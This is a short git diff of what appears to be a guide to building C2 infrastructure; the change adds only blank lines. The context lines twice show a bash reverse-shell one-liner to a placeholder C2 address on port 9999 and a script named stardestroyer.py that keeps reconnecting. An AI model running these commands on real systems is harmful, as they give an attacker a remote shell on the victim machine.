@@ -26,6 +26,7 @@ Build and understand C2 infrastructure.
   - Linux / MacOS
     - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
     - This will drop the moment the C2 server 'drops'
+
 OR
     - This will continue to connect to the C2 server even after it 'drops'
     - `./stardestroyer.py &`
@@ -44,6 +45,7 @@ OR
   - Linux / MacOS
     - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
     - This will drop the moment the C2 server 'drops'
+
 OR
     - This will continue to connect to the C2 server even after it 'drops'
     - `./stardestroyer.py &`
